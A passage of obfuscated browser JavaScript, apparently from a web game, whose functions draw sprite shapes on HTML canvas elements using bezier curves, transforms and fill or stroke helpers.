			ⵠᐃᐃ(Δ, 58 * ᐃ, 73 * ᐃ, ᐃ * 2);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ⵠⵠⲆⲆΔᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 145 * ᐃ;
			Ⲇⵠ.height = 120 * ᐃ;
			Δ.beginPath();
			Δ.scale(.6, .6);
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.translate(ᐃ * ⲆⲆᐃᐃΔⵠⵠ, -8 * ᐃ);
			Δ.moveTo(ᐃ * 101, 72 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144, 69 * ᐃ, ᐃ * 149, ᐃ * 58, 162 * ᐃ, 49 * ᐃ);
			Δ.bezierCurveTo(174 * ᐃ, 31 * ᐃ, ᐃ * 173, 38 * ᐃ, ᐃ * 172, ᐃ * 45);
			Δ.bezierCurveTo(ᐃ * 168, ᐃ * 73, 158 * ᐃ, 75 * ᐃ, ᐃ * 152, ᐃ * 78);
			Δ.bezierCurveTo(ᐃ * 106, 89 * ᐃ, ᐃ * 107, ᐃ * 91, ᐃ * 107, ᐃ * 94);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * ᐃᐃᐃⲆⲆᐃⲆ, ᐃ * 107, 107 * ᐃ, ᐃ * 107, 107 * ᐃ);
			Δ.bezierCurveTo(99 * ᐃ, 112 * ᐃ, ᐃ * 98, ᐃ * 110, 93 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(94 * ᐃ, 107 * ᐃ, 93 * ᐃ, ᐃ * 107, ᐃ * 93, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93, ᐃ * ΔᐃⲆⲆⲆ, ᐃ * 93, ᐃ * 100, ᐃ * 92, ᐃ * 94);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 89, ᐃ * 90, ᐃ * 90, ᐃ * 73, ᐃ * 86);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 81, 40 * ᐃ, 77 * ᐃ, 35 * ᐃ, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 23, ᐃ * 36, 28 * ᐃ, ᐃ * 34, 36 * ᐃ, 46 * ᐃ);
			Δ.bezierCurveTo(45 * ᐃ, 58 * ᐃ, 83 * ᐃ, 72 * ᐃ, ᐃ * 98, 72 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆⲆ], Ⲇᐃ[ⵠⵠᐃⵠ], Ⲇᐃⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.scale(1.1, 1.1);
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.translate(ᐃ * -ⵠⲆⲆΔᐃ, ᐃ * 4);
			Δ.moveTo(101 * ᐃ, ᐃ * 72);
			Δ.bezierCurveTo(144 * ᐃ, ᐃ * 69, 149 * ᐃ, ᐃ * 58, 162 * ᐃ, 49 * ᐃ);
			Δ.bezierCurveTo(174 * ᐃ, 31 * ᐃ, ᐃ * 173, 38 * ᐃ, ᐃ * 172, 45 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 168, 73 * ᐃ, ᐃ * 158, ᐃ * 75, ᐃ * 152, 78 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 89, 107 * ᐃ, ᐃ * 91, 107 * ᐃ, 94 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107, 100 * ᐃ, 107 * ᐃ, ᐃ * 107, ᐃ * 107, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 99, 112 * ᐃ, 98 * ᐃ, 110 * ᐃ, ᐃ * 93, ᐃ * 107);
			Δ.bezierCurveTo(94 * ᐃ, 107 * ᐃ, 93 * ᐃ, ᐃ * 107, 93 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(93 * ᐃ, 100 * ᐃ, ᐃ * 93, ᐃ * 100, 92 * ᐃ, ᐃ * 94);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 89, ᐃ * 90, 90 * ᐃ, 73 * ᐃ, 86 * ᐃ);
			Δ.bezierCurveTo(45 * ᐃ, 81 * ᐃ, ᐃ * 40, 77 * ᐃ, ᐃ * 35, ᐃ * 68);
			Δ.bezierCurveTo(23 * ᐃ, ᐃ * 36, ᐃ * 28, 34 * ᐃ, ᐃ * 36, ᐃ * 46);
			Δ.bezierCurveTo(45 * ᐃ, 58 * ᐃ, 83 * ᐃ, ᐃ * 72, ᐃ * 98, 72 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ΔⲆΔΔ], ᐃ * 4);
			Δ.scale(1.1, 1.1);
			Δ.translate(-9 * ᐃ, ⲆΔⵠᐃ * ᐃ);
			Δ.save();
			Δ.translate(ⲆᐃΔⵠⵠ * ᐃ, ᐃ * 73.06874084472656);
			Δ.rotate(ᐃⵠⲆ);
			Ⲇᐃᐃ(Δ, ᐃ * -61, ᐃ * -38.5, 122 * ᐃ, 40 * ᐃ, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ], Ⲇᐃ[ⵠⵠⵠΔ], 4 * ᐃ);
			Δ.save();
			Δ.translate(100 * ᐃ, 71.36874389648438 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -60.5, ᐃ * -18, ᐃ * 121, ᐃ * 30, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[2], ᐃ * ΔⲆⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 144, 80 * ᐃ);
			Δ.bezierCurveTo(152 * ᐃ, ᐃ * ⲆᐃΔⵠⵠ, 152 * ᐃ, ᐃ * 101, ᐃ * 153, 102 * ᐃ);
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 100, 159 * ᐃ, ᐃ * ⲆᐃᐃΔⵠᐃΔ, 160 * ᐃ, ΔΔᐃⵠᐃ * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, ᐃ * 84, 161 * ᐃ, ᐃ * 84, 162 * ᐃ, 68 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(57 * ᐃ, ᐃ * 75);
			Δ.bezierCurveTo(48 * ᐃ, 101 * ᐃ, ᐃ * 53, ᐃ * 89, ᐃ * 48, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 44, ᐃ * 100, 44 * ᐃ, 100 * ᐃ, 39 * ᐃ, ᐃ * 97);
			Δ.bezierCurveTo(39 * ᐃ, 83 * ᐃ, ᐃ * 39, ᐃ * 83, 39 * ᐃ, 69 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 101, ᐃ * 72);
			Δ.bezierCurveTo(ᐃ * 144, ᐃ * 69, 149 * ᐃ, 58 * ᐃ, ᐃ * 162, 49 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 174, ᐃ * 31, ᐃ * 173, ᐃ * 38, ᐃ * 172, ᐃ * 45);
			Δ.bezierCurveTo(ᐃ * 168, ᐃ * 73, ᐃ * 158, 75 * ᐃ, ᐃ * 152, ᐃ * 78);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 89, 107 * ᐃ, ᐃ * 91, 107 * ᐃ, 94 * ᐃ);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * ⵠⲆⲆᐃⵠΔⵠ, ᐃ * 107, 107 * ᐃ, ᐃ * 107, ᐃ * 107);
			Δ.bezierCurveTo(99 * ᐃ, 112 * ᐃ, 98 * ᐃ, ᐃ * 110, 93 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 94, 107 * ᐃ, 93 * ᐃ, 107 * ᐃ, ᐃ * 93, 107 * ᐃ);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 100, 93 * ᐃ, ᐃ * ᐃᐃⲆⲆⲆⲆⲆ, ᐃ * 92, 94 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 92, 89 * ᐃ, 90 * ᐃ, ᐃ * 90, 73 * ᐃ, ᐃ * 86);
			Δ.bezierCurveTo(45 * ᐃ, 81 * ᐃ, 40 * ᐃ, 77 * ᐃ, ᐃ * 35, 68 * ᐃ);
			Δ.bezierCurveTo(23 * ᐃ, ᐃ * 36, ᐃ * 28, ᐃ * 34, ᐃ * 36, ᐃ * 46);
			Δ.bezierCurveTo(ᐃ * 45, 58 * ᐃ, ᐃ * 83, ᐃ * 72, 98 * ᐃ, ᐃ * 72);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * ⵠΔᐃΔ);
			Δ.translate(ⵠᐃⲆᐃ, ⵠΔⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(115.5 * ᐃ, 116.07290649414062 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159.5, ᐃ * 99.07290649414062, 159.5 * ᐃ, 98.07290649414062 * ᐃ, 159.5 * ᐃ, ᐃ * 98.07290649414062);
			Δ.bezierCurveTo(ᐃ * 155.5, ᐃ * 116.07290649414062, ᐃ * 159.5, 116.07290649414062 * ᐃ, ᐃ * 159.5, ᐃ * 118.07290649414062);
			Δ.bezierCurveTo(147.5 * ᐃ, 130.07290649414062 * ᐃ, ᐃ * 136.5, 132.07290649414062 * ᐃ, ᐃ * 115.5, 138.07290649414062 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ], Ⲇᐃ[2], ΔⲆᐃⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(39.5 * ᐃ, 96.07290649414062 * ᐃ);
			Δ.bezierCurveTo(85.5 * ᐃ, 114.07290649414062 * ᐃ, ᐃ * 62.5, ᐃ * 105.57290649414062, 85.5 * ᐃ, ᐃ * 115.07290649414062);
			Δ.bezierCurveTo(ᐃ * 85.5, 125.57290649414062 * ᐃ, 85.5 * ᐃ, 125.57290649414062 * ᐃ, ᐃ * 85.5, ᐃ * 136.07290649414062);
			Δ.bezierCurveTo(ᐃ * 51.5, 129.07290649414062 * ᐃ, ᐃ * 51.5, ᐃ * 125.07290649414062, 41.5 * ᐃ, ᐃ * 118.07290649414062);
			Δ.bezierCurveTo(ᐃ * 44.5, 106.07290649414062 * ᐃ, 42.5 * ᐃ, 103.07290649414062 * ᐃ, ᐃ * 40.5, 96.07290649414062 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ], Ⲇᐃ[Ⲇⵠⵠᐃ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(86 * ᐃ, ᐃ * 80);
			Δ.bezierCurveTo(ᐃ * 97, 88 * ᐃ, ᐃ * 106, ᐃ * 84, 112 * ᐃ, ᐃ * 80);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 62, 106 * ᐃ, ᐃ * 59, ᐃ * 99, 54 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86, ᐃ * 62, 86 * ᐃ, ᐃ * 73, 86 * ᐃ, 80 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ], Ⲇᐃ[2], ᐃ * 4);
			Δ.scale(.5, .5);
			Δ.translate(ᐃΔⲆⲆᐃ * ᐃ, ᐃ * 71);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 86, ᐃ * 80);
			Δ.bezierCurveTo(97 * ᐃ, ᐃ * 88, 106 * ᐃ, 84 * ᐃ, 112 * ᐃ, ᐃ * 80);
			Δ.bezierCurveTo(ᐃ * 112, 62 * ᐃ, 106 * ᐃ, ᐃ * 59, 99 * ᐃ, 54 * ᐃ);
			Δ.bezierCurveTo(86 * ᐃ, ᐃ * 62, ᐃ * 86, 73 * ᐃ, 86 * ᐃ, ᐃ * 80);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃⲆΔⲆ], ᐃ * ΔⲆⲆⲆ);
			return Ⲇⵠ
		}

		function ΔᐃΔⵠΔⲆⲆⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 400;
			Ⲇⵠ.height = 400 * ᐃ;
			Δ.save();
			Δ.translate(ᐃ * 204, ᐃ * 195.0833282470703);
			Δ.rotate(10.16);
			Ⲇᐃᐃ(Δ, ᐃ * -97.5, -134.5 * ᐃ, 195 * ᐃ, ᐃ * 269, ᐃ * ⲆⵠΔΔᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ΔⲆᐃᐃ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(58.5 * ᐃ, 226.5833282470703 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 120.5, ᐃ * 281.5833282470703, ᐃ * 120.5, ᐃ * 281.5833282470703, 182.5 * ᐃ, ᐃ * 336.5833282470703);
			Δ.bezierCurveTo(ᐃ * 263, ᐃ * 248.5833282470703, ᐃ * 263, ᐃ * 248.5833282470703, ᐃ * 343.5, ᐃ * 160.5833282470703);
			Δ.bezierCurveTo(280.5 * ᐃ, 104.58332824707031 * ᐃ, 280.5 * ᐃ, ᐃ * 104.58332824707031, ᐃ * 217.5, ᐃ * 48.58332824707031);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠΔΔΔΔ], ᐃ * Ⲇᐃⵠᐃ);
			Δ.save();
			Δ.translate(ᐃ * 197, ᐃ * 169.0833282470703);
			Δ.rotate(10.16);
			Ⲇᐃᐃ(Δ, -93.5 * ᐃ, ᐃ * -126.5, 187 * ᐃ, ᐃ * 253, ⵠⵠⲆΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⵠᐃ], Ⲇᐃ[ⵠΔⲆ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(226.5 * ᐃ, 24.583328247070312 * ᐃ);
			Δ.bezierCurveTo(58.5 * ᐃ, 207.5833282470703 * ᐃ, 143 * ᐃ, 116.58332824707031 * ᐃ, ᐃ * 59.5, 208.5833282470703 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆᐃᐃ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 46.133331298828125, ᐃ * 202.64999389648438);
			Δ.bezierCurveTo(46.133331298828125 * ᐃ, 215.64999389648438 * ᐃ, ᐃ * 46.133331298828125, ᐃ * 215.64999389648438, 46.133331298828125 * ᐃ, 228.64999389648438 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ΔⲆⵠ], ⲆᐃΔⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(55.133331298828125 * ᐃ, 211.64999389648438 * ᐃ);
			Δ.bezierCurveTo(55.133331298828125 * ᐃ, 225.14999389648438 * ᐃ, 55.133331298828125 * ᐃ, 225.14999389648438 * ᐃ, 55.133331298828125 * ᐃ, ᐃ * 238.64999389648438);
			Δ.bezierCurveTo(50.133331298828125 * ᐃ, ᐃ * 235.64999389648438, 50.133331298828125 * ᐃ, 235.64999389648438 * ᐃ, ᐃ * 45.133331298828125, ᐃ * 232.64999389648438);
			Δ.bezierCurveTo(ᐃ * 45.133331298828125, ᐃ * 216.64999389648438, 45.133331298828125 * ᐃ, ᐃ * 216.64999389648438, 45.133331298828125 * ᐃ, 200.64999389648438 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ], Ⲇᐃ[ᐃᐃⵠ], ⵠⵠⲆⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 46.133331298828125, 198.39999389648438 * ᐃ);
			Δ.bezierCurveTo(46.133331298828125 * ᐃ, 199.89999389648438 * ᐃ, ᐃ * 46.133331298828125, 199.89999389648438 * ᐃ, ᐃ * 46.133331298828125, ᐃ * 201.39999389648438);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃⲆ], Ⲇᐃ[ⵠΔΔ], ᐃ * ΔⲆᐃⵠⲆΔⵠ);
			Δ.save();
			Δ.translate(249.63333129882812 * ᐃ, 120.89999389648438 * ᐃ);
			Δ.rotate(7.04);
			Ⲇᐃᐃ(Δ, ᐃ * -58.5, -32 * ᐃ, ᐃ * 117, ᐃ * 64, ᐃ * ⲆⵠⲆⲆᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ΔΔΔᐃΔ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 120 * ᐃ;
			Ⲇⵠ.height = ᐃ * ⵠⵠΔᐃᐃ;
			Ⲇᐃᐃ(Δ, ᐃ * 10, ᐃ * 10, 95 * ᐃ, 80 * ᐃ, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ]);
			Ⲇᐃᐃ(Δ, ᐃ * 10, ᐃ * ᐃΔΔΔ, 95 * ᐃ, ᐃ * 80, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ], Ⲇᐃ[4], 4 * ᐃ);
			if (ⵠᐃ == 0) {
				var ᐃⵠ = ᐃᐃΔΔᐃⲆΔ(ᐃ * .75, Ⲇᐃ, 0);
				Δ.drawImage(ᐃⵠ, ᐃ * 22, ⲆⲆᐃᐃΔⵠⵠ * ᐃ)
			} else if (1 == ⵠᐃ) {
				var ᐃⵠ = ᐃᐃΔΔᐃⲆΔ(.75 * ᐃ, Ⲇᐃ, ᐃᐃⲆΔ);
				Δ.drawImage(ᐃⵠ, ᐃ * 22, ᐃ * ᐃΔᐃΔᐃ)
			}
			return Ⲇⵠ
		}

		function ΔⵠⲆᐃΔΔᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 161 * ᐃ;
			Ⲇⵠ.height = 184 * ᐃ;
			Δ.translate(0, 10 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(105.5 * ᐃ, 34.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48.5, 7.609375 * ᐃ, ᐃ * 11.5, 58.609375 * ᐃ, ᐃ * 20.5, ᐃ * 97.609375);
			Δ.bezierCurveTo(44.5 * ᐃ, ᐃ * 161.609375, 70.5 * ᐃ, 171.609375 * ᐃ, ᐃ * 88.5, 156.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 120.5, 129.609375 * ᐃ, 123.5 * ᐃ, 105.609375 * ᐃ, 128.5 * ᐃ, ᐃ * 83.609375);
			Δ.bezierCurveTo(137.5 * ᐃ, ᐃ * 79.609375, 141.5 * ᐃ, 79.609375 * ᐃ, 146.5 * ᐃ, ᐃ * 81.609375);
			Δ.bezierCurveTo(ᐃ * 153.5, ᐃ * 70.609375, ᐃ * 151.5, ᐃ * 65.609375, 148.5 * ᐃ, ᐃ * 61.609375);
			Δ.bezierCurveTo(134.5 * ᐃ, ᐃ * 60.609375, 131.5 * ᐃ, 63.609375 * ᐃ, 127.5 * ᐃ, 66.609375 * ᐃ);
			Δ.bezierCurveTo(127.5 * ᐃ, 55.609375 * ᐃ, 125.5 * ᐃ, ᐃ * 54.609375, ᐃ * 120.5, ᐃ * 51.609375);
			Δ.bezierCurveTo(ᐃ * 128.5, 42.609375 * ᐃ, ᐃ * 136.5, ᐃ * 38.609375, ᐃ * 147.5, 39.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152.5, ᐃ * 23.609375, 147.5 * ᐃ, ᐃ * 21.609375, 140.5 * ᐃ, ᐃ * 17.609375);
			Δ.bezierCurveTo(ᐃ * 120.5, 17.609375 * ᐃ, ᐃ * 114.5, 27.609375 * ᐃ, 106.5 * ᐃ, ᐃ * 35.609375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(45.5 * ᐃ, ᐃ * 144.609375);
			Δ.bezierCurveTo(35.5 * ᐃ, 155.609375 * ᐃ, 37 * ᐃ, ᐃ * 152.109375, 28.5 * ᐃ, ᐃ * 159.609375);
			Δ.bezierCurveTo(ᐃ * 16.5, 154.609375 * ᐃ, ᐃ * 16.5, ᐃ * 151.609375, 17.5 * ᐃ, 141.609375 * ᐃ);
			Δ.bezierCurveTo(25.5 * ᐃ, ᐃ * 134.109375, 25.5 * ᐃ, ᐃ * 134.109375, 33.5 * ᐃ, 126.609375 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(0, -ⲆⵠⲆⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 45.5, ᐃ * 144.609375);
			Δ.bezierCurveTo(ᐃ * 35.5, 155.609375 * ᐃ, ᐃ * 37, 152.109375 * ᐃ, ᐃ * 28.5, ᐃ * 159.609375);
			Δ.bezierCurveTo(16.5 * ᐃ, 154.609375 * ᐃ, ᐃ * 16.5, ᐃ * 151.609375, ᐃ * 17.5, 141.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25.5, ᐃ * 134.109375, 25.5 * ᐃ, ᐃ * 134.109375, 33.5 * ᐃ, ᐃ * 126.609375);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(105.5 * ᐃ, 34.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48.5, ᐃ * 7.609375, ᐃ * 11.5, 58.609375 * ᐃ, 20.5 * ᐃ, 97.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 44.5, 161.609375 * ᐃ, ᐃ * 70.5, 171.609375 * ᐃ, 88.5 * ᐃ, 156.609375 * ᐃ);
			Δ.bezierCurveTo(120.5 * ᐃ, 129.609375 * ᐃ, ᐃ * 123.5, 105.609375 * ᐃ, ᐃ * 128.5, ᐃ * 83.609375);
			Δ.bezierCurveTo(ᐃ * 137.5, ᐃ * 79.609375, ᐃ * 141.5, 79.609375 * ᐃ, ᐃ * 146.5, ᐃ * 81.609375);
			Δ.bezierCurveTo(153.5 * ᐃ, 70.609375 * ᐃ, ᐃ * 151.5, ᐃ * 65.609375, 148.5 * ᐃ, ᐃ * 61.609375);
			Δ.bezierCurveTo(ᐃ * 134.5, 60.609375 * ᐃ, ᐃ * 131.5, ᐃ * 63.609375, ᐃ * 127.5, 66.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 127.5, ᐃ * 55.609375, ᐃ * 125.5, 54.609375 * ᐃ, 120.5 * ᐃ, ᐃ * 51.609375);
			Δ.bezierCurveTo(128.5 * ᐃ, ᐃ * 42.609375, 136.5 * ᐃ, ᐃ * 38.609375, ᐃ * 147.5, 39.609375 * ᐃ);
			Δ.bezierCurveTo(152.5 * ᐃ, 23.609375 * ᐃ, 147.5 * ᐃ, ᐃ * 21.609375, ᐃ * 140.5, ᐃ * 17.609375);
			Δ.bezierCurveTo(ᐃ * 120.5, 17.609375 * ᐃ, ᐃ * 114.5, 27.609375 * ᐃ, ᐃ * 106.5, 35.609375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ΔⲆᐃⵠⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(104.5 * ᐃ, ᐃ * 35.609375);
			Δ.bezierCurveTo(ᐃ * 71.5, 36.609375 * ᐃ, 57.5 * ᐃ, 52.609375 * ᐃ, 58.5 * ᐃ, 81.609375 * ᐃ);
			Δ.bezierCurveTo(59.5 * ᐃ, ᐃ * 103.609375, 66.5 * ᐃ, ᐃ * 107.609375, ᐃ * 66.5, 116.609375 * ᐃ);
			Δ.bezierCurveTo(67.5 * ᐃ, 128.609375 * ᐃ, ᐃ * 65.5, ᐃ * 131.609375, 63.5 * ᐃ, ᐃ * 137.609375);
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[2], ⵠⵠᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 59.5, 72.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 38.5, 80.609375 * ᐃ, ᐃ * 43.5, 81.609375 * ᐃ, ᐃ * 37.5, 89.609375 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃⲆΔⲆ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 60.5, ᐃ * 85.609375);
			Δ.bezierCurveTo(75.5 * ᐃ, ᐃ * 91.609375, 76.5 * ᐃ, 96.609375 * ᐃ, 81.5 * ᐃ, 104.609375 * ᐃ);
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, Ⲇᐃ[Ⲇᐃᐃⵠ], ⲆⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(68.5 * ᐃ, 122.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 79.5, ᐃ * 130.609375, ᐃ * 74.5, 128.609375 * ᐃ, ᐃ * 80.5, 134.609375 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[ⲆΔΔⵠ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 142.5, 18.609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151.5, ᐃ * 28.609375, 151.5 * ᐃ, 32.609375 * ᐃ, ᐃ * 146.5, ᐃ * 40.609375);
			Δ.bezierCurveTo(137.5 * ᐃ, ᐃ * 26.609375, ᐃ * 138.5, ᐃ * 24.609375, 142.5 * ᐃ, 19.609375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(146.5 * ᐃ, 61.50892639160156 * ᐃ);
			Δ.bezierCurveTo(157.5 * ᐃ, 69.50892639160156 * ᐃ, 150.5 * ᐃ, ᐃ * 79.50892639160156, 145.5 * ᐃ, ᐃ * 81.50892639160156);
			Δ.bezierCurveTo(ᐃ * 140.5, ᐃ * 65.50892639160156, 144.5 * ᐃ, 64.50892639160156 * ᐃ, ᐃ * 146.5, ᐃ * 62.50892639160156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ]);
			return Ⲇⵠ
